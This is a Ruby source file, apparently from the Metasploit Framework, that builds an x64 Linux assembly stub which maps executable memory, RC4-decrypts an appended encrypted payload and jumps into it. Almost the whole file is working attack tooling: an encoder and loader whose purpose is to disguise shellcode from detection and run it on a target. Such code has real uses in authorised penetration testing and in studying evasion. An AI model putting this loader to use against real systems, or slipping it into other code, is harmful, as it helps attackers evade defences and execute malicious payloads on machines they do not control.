module Msf::Payload::Linux::X64::Rc4Decrypter

  def rc4_decrypter_stub
    asm = <<-ASM
_start:
      lea r12, [rip + _data_section - _rip_ref]
_rip_ref:

      ; mmap(NULL, payload_size, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
      mov rsi, qword [r12 + 8]
      xor edi, edi 
      mov edx, 7 
      mov r10d, 0x22 
      mov r8d, 0xffffffff
      xor r9d, r9d
      mov eax, 9
      syscall
      mov r13, rax

      ;Initialize S-box (256 bytes) on stack
      sub rsp, 256 
      mov rdi, rsp

      xor ecx, ecx
_init_sbox:
      mov byte [rdi + rcx], cl
      inc ecx
      cmp ecx, 256
      jne _init_sbox

      ;  RC4 Key Scheduling Algorithm (KSA)
      lea r8, [r12 + 24]
      mov r9d, dword [r12]
      xor ecx, ecx
      xor edx, edx

_ksa_loop:
      movzx eax, byte [rdi + rcx]
      add edx, eax

      mov eax, ecx
_mod_loop:
      cmp eax, r9d
      jb _mod_done
      sub eax, r9d
      jmp _mod_loop
_mod_done:

      movzx eax, byte [r8 + rax]
      add edx, eax
      and edx, 0xff

      movzx eax, byte [rdi + rcx]
      movzx r10d, byte [rdi + rdx]
      mov byte [rdi + rcx], r10b
      mov byte [rdi + rdx], al

      inc ecx
      cmp ecx, 256
      jne _ksa_loop

      ; RC4 Pseudo-Random Generation Algorithm
      lea r8, [r12 + 280]
      mov r9d, dword [r12 + 16]
      xor ecx, ecx
      xor edx, edx
      xor r10d, r10d

_prga_loop:
      inc ecx
      and ecx, 0xff

      movzx eax, byte [rdi + rcx]
      add edx, eax
      and edx, 0xff

      movzx eax, byte [rdi + rcx]
      movzx r11d, byte [rdi + rdx]
      mov byte [rdi + rcx], r11b
      mov byte [rdi + rdx], al

      add eax, r11d
      and eax, 0xff
      movzx eax, byte [rdi + rax]

      xor al, byte [r8 + r10]
      mov byte [r13 + r10], al

      inc r10d
      cmp r10d, r9d
      jne _prga_loop

      add rsp, 256
      jmp r13

_data_section:
; Data section layout (populated by rc4_decrypter):
; offset +0:   key_size (8 bytes)
; offset +8:   payload_size (8 bytes)
; offset +16:  encrypted_size (8 bytes)
; offset +24:  key_data (256 bytes)
; offset +280: encrypted_data (variable length)
    ASM

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

  def rc4_decrypter(opts = {})
    key = opts[:key] || Rex::Text.rand_text(16)
    payload = opts[:data] || raise(ArgumentError, "Encrypted data required")

    encrypted_data = Rex::Crypto::Rc4.rc4(key, payload)

    stub = rc4_decrypter_stub.dup
    code_size = stub.length

    # Data section offsets (relative to end of stub code)
    key_size_offset = code_size
    payload_size_offset = code_size + 8
    encrypted_size_offset = code_size + 16
    key_data_offset = code_size + 24
    encrypted_data_offset = code_size + 280

    # Allocate space for data section (24 bytes header + 256 bytes key)
    stub << "\x00" * 280

    # Patch in the values
    stub[key_size_offset, 8] = [key.length].pack('Q<')
    stub[payload_size_offset, 8] = [payload.length].pack('Q<')
    stub[encrypted_size_offset, 8] = [encrypted_data.length].pack('Q<')
    stub[key_data_offset, 256] = key.ljust(256, "\x00")

    stub + encrypted_data
  end

  def stub_size
    rc4_decrypter_stub.length + 280
  end

end